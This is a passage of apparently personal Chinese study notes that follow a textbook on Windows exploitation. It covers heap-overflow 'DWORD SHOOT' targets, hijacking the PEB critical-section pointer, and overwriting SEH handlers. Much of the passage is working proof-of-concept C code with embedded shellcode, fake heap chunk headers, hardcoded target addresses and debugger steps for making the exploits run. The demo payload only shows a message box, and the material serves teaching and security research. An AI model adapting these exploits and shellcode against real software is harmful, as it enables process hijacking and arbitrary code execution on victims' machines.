​		**（1）内存变量**：修改能够影响**程序执行的重要标志变量**，往往可以改变程序流程。例如， 更改身份验证函数的返回值就可以直接通过认证机制。**2.2 节中修改邻接变量**的小试验就是这 种利用方式的例子。在这种应用场景中，DWORD SHOOT 要比栈溢出强大得多，因为栈溢出时溢出的数据必须连续，而 DWORD SHOOT 可以更改内存中任意地址的数据。 

​		**（2）代码逻辑**：修改代码段**重要函数的关键逻辑**有时可以达到一定攻击效果，例如，程序分支处的判断逻辑，或者把身份验证函数的调用指令覆盖为 0x90(nop)。这种方法有点类似于软件破解技术中的“爆破”——通过更改一个字节而改变整个程序的流程，**第 1 章中的破解小试验就是这种应用的**例子。 		

​	**（3）函数返回地址**：栈溢出通过修改函数返回地址能够劫持进程，堆溢出也一样可以利用 DWORD SHOOT 更改函数返回地址。但由于栈帧移位的原因，函数返回地址往往是不固定的， 甚至在同一操作系统和补丁版本下连续运行两次栈状态都会有不同，故 DWORD SHOOT 在这 种情况下有一定局限性，因为移动的靶子不好瞄准。 

​	**（4）攻击异常处理机制**：当**程序产生异常时**，**Windows** 会转入**异常处理机制**。堆溢出很容易引起异常，因此**异常处理机制所使用的重要数据结构**往往会成为 DWORD SHOOT 的上等目标，这包括 S.E.H（structure exception handler）、F.V.E.H（First Vectored Exception Handler）、进程环境块（P.E.B）中的 U.E.F (Unhandled Exception Filter)、线程环境块(T.E.B)中存放的第一个 S.E.H 指针(T.E.H)。有关 Windows 异常处理的知识和利用将在第 6 章中进行系统的介绍。 

​		**（5）函数指针：**系统有时会使用一些函数指针，比如调用动态链接库中的函数、C++中的 虚函数调用等。改写这些函数指针后，在函数调用发生后往往可以成功地劫持进程。但可惜的 是，不是每一个漏洞都可以使用这项技术，这取决于软件的开发方式。 

​		**（6）P.E.B 中线程同步函数的入口地址**：天才的黑客们发现在**每个进程的 P.E.B** 中都**存放着 一对同步函数指针**，指向 **RtlEnterCriticalSection()和 RtlLeaveCriticalSection()**，并且在**进程退出**时会**被 ExitProcess()调用**。如果能够通过 DWORD SH OOT 修改这对指针中的其中一个，那么 在程序退出时 ExitProcess()将会被骗去调用我们的 shellcode。由于 P.E.B 的位置始终不会变化， 这对指针在 P.E.B 中的偏移也始终不变，这使得利用堆溢出开发适用于不同操作系统版本和补 丁版本的 exploit 成为可能。这种方法一经提出就立刻成为了 Windows 平台下堆溢出利用的最 经典方法之一，因为静止的靶子比活动的靶子好打得多，我们只需要把枪架好，闭着眼睛扣扳 机就是了。

​		 鉴于我们目前的知识体系还不完善，这里只是初步总结了堆溢出的利用方式。在学习完下 一章关于异常处理方面的知识后，我们将重新总结内存狙击的利用方式。



#### 调试代码：

**狙击 P.E.B 中 RtlEnterCritical-Section()的函数指针**



​			Windows 为了同步进程下的多个线程，使用了一些同步措施，如锁机制（lock）、信号量 （semaphore）、临界区（critical section）等。许多操作都要用到这些同步机制。

​			当进程退出时，ExitProcess()函数要做很多善后工作，其中必然需要用到临界区函数 RtlEnterCriticalSection()和 RtlLeaveCriticalSection()来同步线程防止“脏数据”的产生

​		ExitProcess()调用临界区函数的方 法比较独特，是通过进程环境块 P.E.B 中偏移 0x20 处存放的函数指针来间接完成的。具体说来 就是在 0x7FFDF020 处存放着指向 RtlEnterCriticalSection()的指针，在 0x7FFDF024 处存放着指向 RtlLeaveCriticalSection()的指针。

![image-20220416154833487](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220416154833487.png)

​		这里，我们以0x7FFDF024处的RtlEnterCriticalSection()指针为目标，联系一下DWORD  SHOOT 后，劫持进程、植入代码的全套动作。

#include <windows.h> 
char shellcode[]="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90……" ；
main() 
{ 
HLOCAL h1 = 0, h2 = 0; 
HANDLE hp; 
hp = HeapCreate(0,0x1000,0x10000); 
h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,200); 

__asm int 3 //used to break process 
memcpy(h1,shellcode,0x200);   //overflow,0x200=512 



/*

C 库函数 **void \*memcpy(void \*str1, const void \*str2, size_t n)** 从存储区 **str2** 复制 **n** 个字节到存储区 **str1**。

声明

下面是 memcpy() 函数的声明。

```
void *memcpy(void *str1, const void *str2, size_t n)
```

参数

- **str1** -- 指向用于存储复制内容的目标数组，类型强制转换为 void* 指针。
- **str2** -- 指向要复制的数据源，类型强制转换为 void* 指针。
- **n** -- 要被复制的字节数。

返回值

该函数返回一个指向目标存储区 str1 的指针。

*/





h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); 

return 0; 
} 

![image-20220416155006187](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220416155006187.png)

#### 分析：

（1）h1 向堆中申请了 200 字节的空间。 

（2）memcpy 的上限错误地写成了 0x200，这实际上是 512 字节，所以会产生溢出。 

（3）h1 分配完之后，后边紧接着的是一个大空闲块（尾块）

（4）超过 200 字节的数据将覆盖尾块的块首。 

（5）用**伪造的指针覆盖尾块块首中的空表指针**，当 h2 分配时，将导致 DWORD SHOOT。 

（6）DWORD SHOOT 的**目标是 0x7FFDF020** 处的 RtlEnterCriticalSection()**函数指针**，可以 简单地将其直接修改为 shellcode 的位置。

 （7）DWORD SHOOT 完毕后，堆溢出**导致异常**，最终将**调用 ExitProcess()结束进程**。 

（8）ExitProcess()在结束进程时需要**调用临界区函数**来同步线程，但却从 P.E.B 中**拿出**了**指 向 shellcode 的指针**，因此 shellcode 被执行

**h1分配以后内存的状态：**

![image-20220416162356980](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220416162356980.png)

​		缓冲区布置如下。 

​	（1）将我们那段 168 字节的 shllcode 用 0x90 字节补充为 200 字节。 

（2）紧随其后，附上 8 字节的块首信息。为了防止在 DWORD SHOOT 发生之前产生异常， 不妨直接将块首从内存中复制使用：“\x16\x01\x1A\x00\x00\x10\x00\x00”。 

（3）前向指针是 DWORD SHOOT 的“子弹”，这里直接使用 shellcode 的起始地址 0x00360688。

（4）后向指针是 DWORD SHOOT 的“目标”，这里填入 P.E.B 中的函数指针地址 0x7FFDF020。

**//前项写入后项  后项写入前项+4**

![image-20220416162624891](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220416162624891.png)

这时，整个缓冲区的内容如下。

 `char shellcode[]=`  `"\x90\x90\x90\x90\x90\x90\x90\x90"  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"  "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"  "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"  "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"  "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"  "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"  "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"  "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"  "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"  "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"  "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"  "\x16\x01\x1A\x00\x00\x10\x00\x00"// head of the ajacent free block  "\x88\x06\x36\x00\x20\xf0\xfd\x7f";`

​		运行一下，发现那个可爱的显示 failwest 的消息框没有蹦出来。原来，这里有一个问题： 被我们**修改的 P.E.B 里的函数指针不光会被 ExitProcess()调用**，shellcode 中的函数也会使用。 当 shellcode 的函数使用临界区时，会像 ExitProcess()一样被骗。

​		 为了解决这个问题，我们对 shellcode 稍加修改，在一开始就把我们 DWORD SHOOT 的指针**修复回去**，以防出错。重新调试一遍，记下 0x7FFDF020 处的函数指针为 0x77F82060。

![image-20220416163106801](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220416163106801.png)

修复可以通过下面 3 条指令实现，

![image-20220416163558226](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220416163558226.png)

将这 3 条指令的机器码放在 shellcode 之前，重新调整 shellcode 的长度为 200 字节，然后是 8 字节块首，8 字节伪造的指针.

现在把断点去掉，build 后直接运行。  可能会提示有异常产生（堆都溢出了，产生异常也很正常）

```c
#include <windows.h> 
char shellcode[]="\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90" 
//repaire the pointer which shooted by heap over run 
"\xB8\x20\xF0\xFD\x7F" //MOV EAX,7FFDF020 
"\xBB\x60\x20\xF8\x77" //MOV EBX,77F82060 the address may releated to 
//your OS 
"\x89\x18"//MOV DWORD PTR DS:[EAX],EBX 
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" 
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53" 
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B" 
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95" 
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59" 
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A" 
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75" 
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03" 
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB" 
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" 
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x16\x01\x1A\x00\x00\x10\x00\x00"// head of the ajacent free block 
"\x88\x06\x36\x00\x20\xf0\xfd\x7f"; 
//0x00520688 is the address of shellcode in first heap block, you have to 
//make sure this address via debug 
//0x7ffdf020 is the position in PEB which hold a pointer to 
//RtlEnterCriticalSection()and will be called by ExitProcess() at last
main() 
{ 
HLOCAL h1 = 0, h2 = 0; 
HANDLE hp; 
hp = HeapCreate(0,0x1000,0x10000); 
h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,200); 

//__asm int 3 //used to break process 
memcpy(h1,shellcode,0x200);   //overflow,0x200=512 

h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); 

return 0; 
} 
```



![image-20220416164359196](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220416164359196.png)

总结：上述实验  就是把shellcode的起始地址（0x00360688）写入 0x7ffdf020

**（正常情况下，ExitProcess()在结束进程时将调用此地址对应的程序，现在改成了shellcode则会调用shellcode。）**

因为是双链表根据上面的分析也可以把 前项指针写为 7ffdf01C  后项指针写为 00360688  可自行调试

### 5.2.3堆溢出利用的注意事项 

#### 1．调试堆与常态堆的区别

​		如我们在 5.2 节中介绍的那样，堆管理系统会检测进程是否正在被调试。**调试态的堆和常态**堆是有很大区别的，没有经验的初学者在做堆溢出实验时往往会被误导去研究调试态的堆。 如果您发现自己的 shllecode 能在调试器中得到正常的执行，而单独运行程序却失败，不妨考虑一下这方面的问题。**本章中使用了 int 3 中断指令在堆分配之后暂停程序**，然后 attach 进程的 方法。这是一种省事的做法，但大多数时候我们是无法修改源码的。**另一种办法是直接修改用 于检测调试器的函数的返回值**，这种方法在调试异 常处理机制时会经常用到，我们将在**第 6 章 中举**例介绍。

#### 2．在 shellcode 中修复环境？？？？？？？？

​		本节实验中就遇到了这样的问题，在劫持进程后需要立刻修复 P.E.B 中的函数指针，否则 会引起很多其他异常。一般说来，在大多数堆溢出中都需要做一些修复环境的工作

​		shellcode 中的第一条指令 CDF 也是用来修复环境的。如果您把这条指令去掉，会发现 shellcode 自身发生内存读写异常。这是因为在 ExitProcess()调用时，这种特殊的上下文会把通 常状态为 0 的 DF 标志位修改为 1。这会导致 shellcode 中 LODS DWORD PTR DS:[ESI]指令在 向 EAX 装入第一个 hash 后将 ESI 减 4，而不是通常的加 4，从而在下一个函数名 hash 读取时 发生错误。

​		在堆溢出中，有时还需要修复被我们折腾得乱七八糟的堆区。通常，比较简单修复堆区的 做法包括如下步骤。

​	（1）在堆区偏移 0x28 的地方存放着堆区所有空闲块的总和 TotalFreeSize。 

​	（2）把一个较大块（或干脆直接找个暂时不用的区域伪造一个块首）块首中标识自身大小 的两个字节（self size）修改成堆区空闲块总容量的大小（TotalFreeSize）。 

​	（3）把该块的 flag 位设置为 0x10（last entry 尾块）。 

​	（4）把 freelist[0]的前向指针和后向指针都指向这个堆块。 这样可以使整个堆区“看起来好像是”刚初始化完只有一个大块的样子，不但可以继续完 成分配工作，还保护了堆中已有的数据。

#### 3．定位 shellcode 的跳板

​		**有时，堆的地址不固定**，因此我们不能像本节实验中这样在 DWORD SHOOT 时直接使用 shellcode 的起始地址。在 3.3 节里我们介绍了很多种定位栈中 shellcode 的思路。**和栈溢出中的 jmp esp 一样**，**经常**也会**有寄存器指向堆区离 shellcode 不远的地方**。比如 David Litchfield 在 black  hat 上的演讲中指出的在利用 U.E.F 时可以使用几种指令作为跳板定位 shellcode，这些指令一 般可以在 netapi32.dll、user32.dll、 rp crt4.dll 中搜到不少，代码如下所示

`CALL DWORD PTR [EDI + 0x78]` 
`CALL DWORD PTR [ESI+0x4C]` 
`CALL DWORD PTR [EBP+0x74]`

#### 4．DWORD SHOOT 后的“指针反射”现象

回顾前面介绍 DWORD SHOOT 时所举的例子：

`int remove (ListNode * node)` 
`{node -> blink -> flink = node -> flink;` 
`node -> flink -> blink = node -> blink;` 
`return 0;` 
`}`

​		其中，node -> blink -> flink = node -> flink 将会导致 DWORD SHOOT。细心的读者可能会 发现双向链表拆除时的第二次链表操作 node -> flink -> blink = node -> blink 也能导致 DWORD  SHOOT。这次，DWORD SHOOT 将把目标地址写回 shellcode 起始位置偏移 4 个字节的地方。 我把类似这样的第二次 DWORD SHOOT 称为“指针反射”

​		有时在指针反射发生前就会产生异常。然而，**大多数情况下，指针反射是会发生**的，糟糕 的是，它会把目标地址刚好写进 shellcode 中。这对于没有跳板直接利用 DWORD SHOOT 劫持 进程的 exploit 来说是一个很大的限制，因为它将破坏 4 个字节的 shellcode。

​		幸运的是，很多情况下 4 个字节的目标地址都会被处理器当做“无关痛痒”的指令安全地 执行过去。例如，我们本节实验中就会把 0x7FFDF020 反射回 shellcode 中偏移 4 字节的位置 0x0052068C。

​		**但如果**在为某个特定漏洞开发 exploit 时，**指针反射发生且目标**指针**不能**当做“无关痛痒” 的指令安全地**执行**过去，那就得开动脑筋使用**别的目标**，或者**使用跳板**技术。

# 第6章  内存攻击技术

​	漏洞利用技术无外乎溢出、跳转、指令、指针……本章将抛开调试和实验，集 中介绍近年来一些新型的漏洞利用思路和攻击技巧。

## 6.1 狙击 Windows 异常处理机制

### 6.1.1 S.E.H 概述

​		**操作系统**或**程序在运行**时**，难免会遇到**各种各样的**错误**，如除零、非法内存访问、文件打 开错误、内存不足、磁盘读写错误、外设操作失败等。为了**保证系统**在遇到错误时**不至于崩溃**， 仍能够健壮稳定地继续运行下去，**Windows** 会对运行在其中的程序**提供一次补救**的机会来处理 错误，这种机制就是**异常处理机制**

​		**S.E.H** 即**异常处理结构体**（Structure Exception Handler）,它是 **Windows 异常处理机制**所采用的重要数据结构。每个 S.E.H 包含**两个 DWORD 指针**：S.E.H 链表指针和异常处理函数句柄，共 8 个字节，如图 6.1.1 所示。

![image-20220426212446727](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220426212446727.png)

作为**对 S.E.H 的初步了解**，我们现在只需要知道**以下几个要点**

 （1）**S.E.H 结构体**存放**在系统栈**中。
（2）当**线程初始化时**，会**自动向栈中安装**一个 **S.E.H**，作为线程默认的异常处理。
（3）**如果**程序**源代码**中**使用**了 **_try{} __except{}**或者 **Assert 宏等异常处理机制**，编译器将最终通过向当前函数栈帧中安装一个 S.E.H 来实现异常处理。
（4）**栈中**一般会**同时**存在**多个** S.E.H。
（5）栈中的多个 **S.E.H 通过链表指针**在栈内**由栈顶向栈底**串成**单向链表**，位于**链表最顶端的 S.E.H** 通过 **T.E.B（**线程环境块**）0 字节偏移处**的**指针**标识。(S.E.H 链表如图 6.1.2 所示。)
（6）当**异常发生**时，**操作系统**会**中断程序**，并**首先从 T.E.B** 的 **0 字节偏移处取出**距离栈顶最近的 **S.E.H**，使用异常处理函数句柄所指向的代码来处理异常。
（7）当离“事故现场”最近的异常处理函数运行失败时，将**顺着 S.E.H 链表依次尝试**其他的异常处理函数。
（8）**如果**程序安装的**所有异常处理函数都不能处理**，系统将**采用默认**的**异常处理函数**。通常，这个函数会弹出一个错误对话框，然后强制关闭程序。

![image-20220426214025341](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220426214025341.png)

### 6.1.2 在栈溢出中利用 S.E.H

#### 代码

```
#include <windows.h> 
#include<stdio.h>
char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"; 
DWORD MyExceptionhandler(void) 
{ 
printf("got an exception, press Enter to kill process!\n"); 
getchar(); 
ExitProcess(1); 
return 0;
} 
void test(char * input) 
{ 
char buf[200]; 
int zero=0; 
__asm int 3 //used to break process for debug 
__try 
{ 
strcpy(buf,input); //overrun the stack 
zero=4/zero; //generate an exception 
} 
__except(MyExceptionhandler()){} 
} 

main() 
{ 
test(shellcode); 
}
```

/*
**try-except** 语句是一个 特定于 Microsoft 的 扩展，支持 C 和 C++ 语言中的结构化异常处理。 它使目标应用程序能够控制正常终止程序执行的事件的时间。 此类事件称为 结构化异常，或短期 异常 。 处理这些异常的机制称为 结构化异常处理 (SEH) 。
	____try {
        // guarded code
    }
    ____except ( /* filter expression */ ) {
        // termination code

**执行过程如下**所示：

1. 执行受保护节。
2. 如果在受保护节执行过程中未发生异常，则继续执行 **`__except`** 子句之后的语句。
3. 如果在执行受保护的节期间或受保护的节调用的任何例程中发生异常，则 **`__except`** 计算表达式。 有三种可能的值：
   - `EXCEPTION_CONTINUE_EXECUTION` (-1) 异常已消除。 从出现异常的点继续执行。
   - `EXCEPTION_CONTINUE_SEARCH` 无法识别 (0) 异常。 继续向上搜索堆栈查找处理程序，首先是所在的 `try-except` 语句，然后是具有下一个最高优先级的处理程序。
   - `EXCEPTION_EXECUTE_HANDLER` (1) 异常将被识别。 通过执行 **`__except`** 复合语句将控制权传输到异常处理程序，然后在块之后 **`__except`** 继续执行。

*/

对**代码简要解释**如下：
（1）函数 test 中存在典型的栈溢出漏洞。
（2）____try{}会在 test 的函数栈帧中安装一个 S.E.H 结构。
（3）____try 中的**除零操作**会产生一个**异常**。
（4）当 strcpy 操作**没有产生溢出**时，除零操作的**异常**将最终**被**MyExceptionhandler 函数**处理**。
（5）当 strcpy 操作**产生溢出**，并精确地**将栈帧中**的 **S.E.H 异常处理句柄**修改为 **shellcode** 的**入口地址**时，操作系统将会错误地使用 shellcode 去处理除零异常，也就是说，代码植入成功。
（6）此外，异常处理机制与堆分配机制类似，会检测进程是否处于调试状态。如果直接使用调试器加载程序，异常处理会进入调试状态下的处理流程。因此，我们这里同样采用直接在 代码中加入断点____asm  int 3，让进程自动中断后再用调试器 attach 的方法进行调试

####  调试

**1.首先找到要修改的地址和 要修改的值**

​		暂时将 shellcode 赋值为一段不至于产生溢出的 0x90，按照实验环境编译运行代码，程序 会自动中断，并提示选择终止运行或者进行调试。

​    	在字符串复制操作完毕后，数组中的 0x90 能够帮我们在调试器中轻易地 确定 shellcode 的起始位置 0x0012FE48，如下图：

![image-20220427165115825](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220427165115825.png)

​		单击 OllyDbg 菜单“View”中的“SEH chain”（汉化中点击   查看   中的 SEH链），Ollydbg 会显示出目前栈中所有的 S.E.H 结构的位置和其注册的异常回调函数句柄  如图：

![image-20220427165154291](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220427165154291.png)

​		OllyDbg 当前线程一共安装了 3 个 S.E.H，离栈顶最近的位于 0x0012FF68，如果在当前函 数内发生异常，首先使用的将是这个 S.E.H。到栈中看看这个 S.E.H 的状况，

![image-20220427170021032](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220427170021032.png)

0012ff68   处中  0012ffb0   为指向下一个SEH的指针

0012ff6c   处中   004013ac  为异常处理函数   所以这里是需要修改的地方 

**2.组织缓冲区**

​		把 0x0012FF6C 处的回调句柄修改成 shellcode 的起始地址 0x0012FE98，缓冲区起始地址 0x0012FE98 与异常句柄 0x0012FF1C 之间共有 212 个字节的间隙，即超出缓冲区 12 个字节后的部分将覆盖 S.E.H。

​		仍然使用弹出“failwest”消息框的 shellcode 进行测试，将不足 212 字节的部分用 0x90 字 节补齐；213~216 字节使用 0x0012FE98 填充，用于更改异常回调函数的句柄；最后删去代码中的中断指令_asm int 3。

```
#include <windows.h> 
#include<stdio.h>

char shellcode[]= 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" 
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53" 
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B" 
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95" 
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59" 
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A" 
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75" 
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03" 
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB" 
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" 
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x98\xFE\x12\x00"; 
DWORD MyExceptionhandler(void) 
{ 
printf("got an exception, press Enter to kill process!\n"); 
getchar(); 
ExitProcess(1); 
return 0;
} 
void test(char * input) 
{ 
char buf[200]; 
int zero=0; 
_try 
{ 
strcpy(buf,input); //overrun the stack 
zero=4/zero; //generate an exception 
} 
_except(MyExceptionhandler()){} 
} 
void main() 
{ 
test(shellcode); 
} 
```

重新编译，build 成 release 之后运行，如图

![image-20220427171048300](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220427171048300.png)

这时操作系统将错误地使用 shellcode 去处理除零异常，从而使植入的代码获得执行。

### 6.1.3 在堆溢出中利用 S.E.H

堆中发生溢出后往往同时伴随着异常的产生，所以，S.E.H 也是堆溢出中 DWORD SHOOT 常常选用的目标。

#### 代码

```
#include <windows.h> 
char shellcode[]= 
"\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" 
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53" 
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B" 
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95" 
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59" 
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A" 
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75" 
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03" 
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB" 
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" 
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90" 

"\x16\x01\x1A\x00\x00\x10\x00\x00"// head of the ajacent free block 

"\x88\x06\x36\x00"//0x00520688 is the address of shellcode in first 
//Heapblock 
"\x30\xff\x12\x00";//target of DWORD SHOOT 
DWORD MyExceptionhandler(void) 
{ 
ExitProcess(1); 
return 0;
} 
main() 
{ 
HLOCAL h1 = 0, h2 = 0; 
HANDLE hp; 
hp = HeapCreate(0,0x1000,0x10000); 
h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,200); 
memcpy(h1,shellcode,0x200);// over flow here, noticed 0x200 means 
//512 ! 
//__asm int 3 // uesd to break the process 
__try 
{ 
h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); 
} 
__except(MyExceptionhandler()){} 
return 0; 
} 
```



对**实验思路**和代码简要解释如下。

（1）**溢出第一个堆块**的数据将写入后面的空闲堆块，在**第二次堆分配时**发生 DWORD  SHOOT。堆溢出和 DWORD SHOOT 的分析请参见 5.2 节中的介绍。 （2）将 **S.E.H 的异常回调函数地址**作为 DWORD SHOOT 的目标，将其**替换**为 **shellcode** 的 **入口地址**，异常发生后，操作系统将错误地把 shellcode 当作异常处理函数而执行。

​		除了 DWORD SHOOT 的 Target 不一样之外，缓冲区内其余的数据都和 5.2 节中所介绍的一样。首先，我们把最后 4 个字节的 target 设置为 0x90909090，这显然是一个无效的内存地址， 因此会**触发异常**。我们所需要做的就是在程序运行时，**找到 S.E.H 的位置**，然后把 DWORD  SHOOT 的 target 指向 S.E.H 的回调句柄

#### 调试

​		首先应当确认 OllyDbg 能够捕捉所有的异常，方法是查看菜单“options”下的“debugging  option”中“Exceptions”选项中没有忽略任何类型的异常，如下图

![image-20220427172442119](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220427172442119.png)

​											OllyDbg 异常捕捉选项

​		然后按照实验要求将代码编译运行，程序会自动中断，使用 OllyDbg attach 到进程上，直 接按 F9 键继续执行。

​		 DWORD SHO OT 发生后，程序产生异常。OllyDbg 捕捉到异常后会自动中断，如图 

![img](file:///C:\Users\jinwe\AppData\Roaming\Tencent\Users\166599381\QQ\WinTemp\RichOle\EUJ$FLOT(K9)D_BJ{9Z6$TR.png)

这时查看栈中的 S.E.H 情况：View→SEH chain，出现如图界面：

![image-20220427173012733](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220427173012733.png)

​			发现离**第一个 S.E.H** 位于 **0x0012FF2C** 的地方，那么**异常回调函数的句柄**应该位于这个地址后 4 个字节的位置 **0x0012FF30**。现在，将 DWORD SHOOT 的目标地址由 0x90909090 改为 0x0012FF30，去掉程序中的中断指令，重新编译运行，

![image-20220427173643457](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220427173643457.png)

### 6.1.4 深入 Windows 异常处理

​		从攻击者的角度讲，对异常处理的掌握只要知道改写 S.E.H 能够劫持进程、植入恶意代码 可能就够了。但是，作为安全技术的研究人员，异常处理机制还是很有研究价值的，而且几乎 所有大师级别的安全专家都对异常处理机制了如指掌。如果您掌握了异常处理的所有细节，那 么突发奇想地创造出一种新的漏洞利用方法也不是没有可能。

​		本节在总结前人研究的基础上，将对 Windows 异常处理做一个逐步深入的介绍，能够在进行更深层次的调试和研究时，起到一定的指导作用。如果只是关注漏洞利用技术本身，可以跳过这里继续后面的章节。

#### （1）不同级别的 S.E.H 

​		**异常处理**的**最小作用域**是**线程**，**每个线程**都拥**有自己**的 **S.E.H 链表**。线程发生**错误**时，首先将使用**自身**的 **S.E.H** 进行处理。

​		**一个进程**中**可能**同时存在很**多个线程**。此外，**进程中**也**有一个**能够“纵览**全局**”**的异常处理**。当**线程自身**的 **S.E.H 无法“摆平”错误**的时候，进程 S.E.H 将发挥作用。这种**异常处理不仅**仅能影响出错的线程，进程下属的**所有线程可能**都会受到影响

​		除了**线程异常处理**和**进程异常处理**之外，**操作系统**还会**为所有程序提供**一个**默认**的**异常处理**。当**所有**的**异常处理函数**都无法处理错误时，这个**默认的异常处理函数将被最终调用**，其**结果一般是显示一个错误对话框**（我们经常见到的程序崩溃时的那种对话框）。

